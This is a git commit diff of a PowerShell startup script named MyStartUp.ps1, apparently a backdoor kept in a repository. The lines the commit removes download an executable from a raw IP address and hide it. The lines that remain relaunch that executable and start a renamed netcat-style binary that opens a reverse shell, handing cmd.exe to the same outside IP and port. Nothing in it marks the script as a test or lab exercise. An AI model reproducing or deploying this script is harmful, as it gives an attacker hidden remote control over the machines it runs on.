4ea806d438ce16ffa88a10b8a767d0e57f88eb3a
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-04-21 13:27:16 -0400

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,11 +1,6 @@
 if (-not (Test-Path "C:\Users\Alooo")) {
     Write-Host "No"
 } else {
-    $lmlPath = "C:\Users\Alooo\Downloads\lml.exe"
-    if (-not (Test-Path $lmlPath)) {
-        Invoke-WebRequest -Uri "http://193.161.193.99:37515/lml.exe" -OutFile $lmlPath
-        attrib +h $lmlPath
-    }
     taskkill /F /IM lml.exe
     C:\Users\Alooo\Downloads\lml.exe
     Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv", "193.161.193.99", "37515", "-e", "cmd.exe"
